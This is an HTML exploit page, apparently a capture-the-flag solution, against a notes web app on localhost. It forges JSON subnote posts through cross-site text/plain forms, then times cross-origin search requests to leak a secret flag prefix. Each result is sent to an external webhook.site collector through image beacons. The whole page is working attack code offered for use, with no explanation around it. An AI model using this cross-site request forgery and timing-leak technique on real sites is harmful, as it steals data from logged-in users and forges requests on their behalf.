<!doctype html><html><body><iframe name="sink" style="display:none"></iframe><script>
const TARGET='https://localhost:3000', COLLECT='https://9a73f059-d808-47c4-b035-4281889d9fea.webhook.site/log', NOTE_ID=1, N_SUB=30;
const WORDS=Array(4000).fill('qq').join(' ');
function log(k,v){new Image().src=COLLECT+'?'+k+'='+encodeURIComponent(v)+'&t='+Date.now();}
async function authcheck(path){try{const r=await fetch(TARGET+path,{credentials:'include',mode:'no-cors',redirect:'manual',cache:'no-store'});return r.type;}catch(e){return 'ERR:'+e.message;}}
function addSub(){return new Promise(res=>{const f=document.createElement('form');f.method='POST';f.action=TARGET+'/notes/'+NOTE_ID+'/subnotes';f.enctype='text/plain';f.target='sink';const i=document.createElement('input');i.name='{"content":"';i.value=' '+WORDS+'"}';f.appendChild(i);document.body.appendChild(f);const s=document.getElementsByName('sink')[0];s.onload=()=>{try{f.remove();}catch(e){}res();};f.submit();});}
async function tq(q){const url=TARGET+'/notes/search?q='+encodeURIComponent(q);let b=Infinity;for(let i=0;i<3;i++){const t0=performance.now();try{await fetch(url,{mode:'no-cors',credentials:'include',cache:'no-store'});}catch(e){}const dt=performance.now()-t0;if(dt<b)b=dt;}return b;}
async function run(){
 log('D','start');
 log('auth_notes', await authcheck('/notes'));
 log('auth_search', await authcheck('/notes/search?q=inctf{'));
 for(let i=0;i<N_SUB;i++){await addSub();}
 log('D','amp_done');
 log('t_main', Math.round(await tq('inctf{')));
 log('t_sub', Math.round(await tq('qq')));
 log('t_ctrl', Math.round(await tq('zzqzqzx')));
 log('D','diag_done');
}
run();
</script></body></html>
